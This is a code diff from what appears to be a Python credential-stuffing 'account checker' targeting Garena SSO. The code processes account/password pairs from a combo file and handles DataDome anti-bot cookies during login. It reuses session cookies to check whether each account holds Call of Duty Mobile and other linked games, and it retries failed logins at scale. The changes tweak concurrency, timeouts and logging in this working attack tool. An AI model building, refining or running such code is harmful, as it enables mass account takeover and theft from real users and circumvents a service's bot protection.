                 details = parse_account_details({'user_info': account_data_json})
             
-            # Run CODM check + game connections in parallel to save ~300ms
-            # per account. With 150 threads × 300ms = 45s saved per 100 accounts.
-            game_connections = []
-            has_codm = False
-            codm_info = {}
+            codm_session = requests.Session()
+            for cookie_name in ['sso_key', 'apple_state_key', 'datadome']:
+                if cookie_name in session.cookies:
+                    codm_session.cookies.set(cookie_name, session.cookies.get(cookie_name), domain='.garena.com')
             
-            from concurrent.futures import ThreadPoolExecutor as _TPE
-            with _TPE(max_workers=2) as _inner_ex:
-                # CODM check (uses a fresh session to avoid cookie bleed)
-                def _do_codm():
-                    cs = requests.Session()
-                    for cn in ['sso_key', 'apple_state_key', 'datadome']:
-                        if cn in session.cookies:
-                            cs.cookies.set(cn, session.cookies.get(cn), domain='.garena.com')
-                    try:
-                        return check_codm_account(cs, account)
-                    finally:
-                        cs.close()
-                
-                codm_fut = _inner_ex.submit(_do_codm)
-                
-                # Game connections (only if enabled)
-                games_fut = None
-                if CHECK_OTHER_GAMES:
-                    games_fut = _inner_ex.submit(get_game_connections, session, account)
-                
+            has_codm, codm_info = check_codm_account(codm_session, account)
+            codm_session.close()
+            
+            game_connections = []
+            if CHECK_OTHER_GAMES:
                 try:
-                    has_codm, codm_info = codm_fut.result(timeout=8)
-                except Exception:
-                    has_codm, codm_info = False, {}
-                
-                if games_fut is not None:
-                    try:
-                        game_connections = games_fut.result(timeout=5) or []
-                        # [suppressed] game connections found print
-                    except Exception as _ge:
-                        # [suppressed] game check error print
-                        game_connections = []
+                    if not suppress_print:
+                        console.print(f'  [dim]🔄 Checking game connections for {account}...[/dim]')
+                    game_connections = get_game_connections(session, account)
+                    if game_connections:
+                        if not suppress_print:
+                            console.print(f'  [dim]✓ Found {len(game_connections)} game connection(s)[/dim]')
+                            for g in game_connections:
+                                console.print(f'  [dim]  • {g.get("game")}: {g.get("role")} ({g.get("region")})[/dim]')
+                    else:
+                        if not suppress_print:
+                            console.print(f'  [dim]✗ No game connections found[/dim]')
+                except Exception as _ge:
+                    if not suppress_print:
+                        console.print(f'  [yellow]⚠ Game check error: {_ge}[/yellow]')
+                    logger.warning(f'[GAMES] Failed for {account}: {_ge}')
             
             fresh_datadome = datadome_manager.extract_datadome_from_session(session)
             if fresh_datadome:
@@ -3314,7 +3311,8 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
             if attempt < max_retries:
                 backoff = min(2 ** attempt, 60) + random.uniform(0, 2)
-                # [suppressed] connection/timeout backoff print
+                if not suppress_print:
+                    print(f'  {_YL}⚠  Connection/Timeout — backoff {backoff:.1f}s ({attempt}/{max_retries}){_RST}')
                 time.sleep(backoff)
                 continue
             err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': 'Connection/Timeout Error'}
@@ -3326,7 +3324,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             
         except Exception as e:
             if attempt < max_retries:
-                time.sleep(0.2)
+                time.sleep(0.8)
                 continue
             logger.error(f'[ERROR] Unexpected error processing {account}')
             err_data = {'account': account, 'password': password, 'is_error': True, 'error_reason': f'Unexpected Error: {str(e)}'}
@@ -3335,6 +3333,7 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             if auto_remove:
                 _queue_auto_remove(account, password, file_manager, combo_file_path)
             return 'ERROR'
+
 
 def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
     url = 'https://sso.garena.com/api/prelogin'
@@ -3360,7 +3359,7 @@ def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
             }
             if cookie_parts:
                 headers['cookie'] = '; '.join(cookie_parts)
-            resp = session.get(url, headers=headers, params=params, timeout=5)
+            resp = session.get(url, headers=headers, params=params, timeout=8)
             new_dd = resp.cookies.get('datadome')
             if new_dd:
                 session.cookies.set('datadome', new_dd, domain='.garena.com')
@@ -3400,6 +3399,7 @@ def _prelogin_no_ip_wait(session, account, datadome_manager, max_retries=6):
         except Exception:
             continue
     return (None, None, None)
+
 
 def validator_check():
     clear_screen()
